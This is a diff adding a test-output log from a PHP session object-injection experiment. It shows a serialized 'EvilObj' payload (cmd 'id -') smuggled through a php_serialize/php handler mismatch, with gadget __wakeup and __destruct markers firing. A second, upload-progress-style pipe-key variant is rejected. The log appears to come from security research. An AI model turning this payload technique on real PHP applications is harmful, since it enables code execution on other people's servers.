@@ -1,0 +1,51 @@
+==================================================================
+ A1: serialize_handler mismatch  (write=php_serialize, read=php)
+ build: 8.5.12 cli
+==================================================================
+[writer] handler=php_serialize wrote session
+--- session file on disk (hexdump -C first 400 bytes) ---
+00000000  61 3a 31 3a 7b 73 3a 38  3a 22 75 73 65 72 70 72  |a:1:{s:8:"userpr|
+00000010  65 66 22 3b 73 3a 36 36  3a 22 69 6e 6a 7c 4f 3a  |ef";s:66:"inj|O:|
+00000020  37 3a 22 45 76 69 6c 4f  62 6a 22 3a 32 3a 7b 73  |7:"EvilObj":2:{s|
+00000030  3a 33 3a 22 63 6d 64 22  3b 73 3a 34 3a 22 69 64  |:3:"cmd";s:4:"id|
+00000040  20 2d 22 3b 73 3a 34 3a  22 6e 6f 74 65 22 3b 73  | -";s:4:"note";s|
+00000050  3a 35 3a 22 70 77 6e 65  64 22 3b 7d 22 3b 7d     |:5:"pwned";}";}|
+0000005f
+--- READ request (default php handler) ---
+
+Warning: session_start(): Failed to decode session object. Session has been destroyed in /tmp/p2s_mm/reader.php on line 10
+[reader] handler=php
+
+Deprecated: Using null as an array offset is deprecated, use an empty string instead in /tmp/p2s_mm/reader.php on line 13
+
+Warning: Undefined array key "" in /tmp/p2s_mm/reader.php on line 13
+[reader] first session key: NULL
+
+Fatal error: Uncaught TypeError: get_class(): Argument #1 ($object) must be of type object, null given in /tmp/p2s_mm/reader.php:15
+Stack trace:
+#0 {main}
+  thrown in /tmp/p2s_mm/reader.php on line 15
+--- POP markers after reader ran ---
+[PASS] WAKEUP_FIRED.txt exists: wakeup fired cmd=id -
+[PASS] DESTRUCT_FIRED.txt exists: destruct fired cmd=id -
+
+==================================================================
+ A2: NO mismatch - pure 'php' handler both sides, pipe in session KEY
+     (byte-equal to upload-progress hook storage format)
+==================================================================
+
+Warning: session_write_close(): Failed to write session data. Data contains invalid key "upload_progress_inj|O:7:"EvilObj":2:{s:3:"cmd";s:4:"id -";s:4:"note";s:5:"pwned";}" in /tmp/p2s_mm/writer2.php on line 11
+[writer2] handler=php wrote pipe-key session
+--- session file on disk (hexdump -C first 400 bytes) ---
+--- READ request (same php handler) ---
+[reader2] handler=php
+[reader2] session keys: 
+[reader2] var_dump:
+array(0) {
+}
+--- POP markers after reader2 ran ---
+[FAIL] WAKEUP2_FIRED.txt missing
+[FAIL] DESTRUCT2_FIRED.txt missing
+==================================================================
+ done; artifacts in /tmp/p2s_mm
+==================================================================
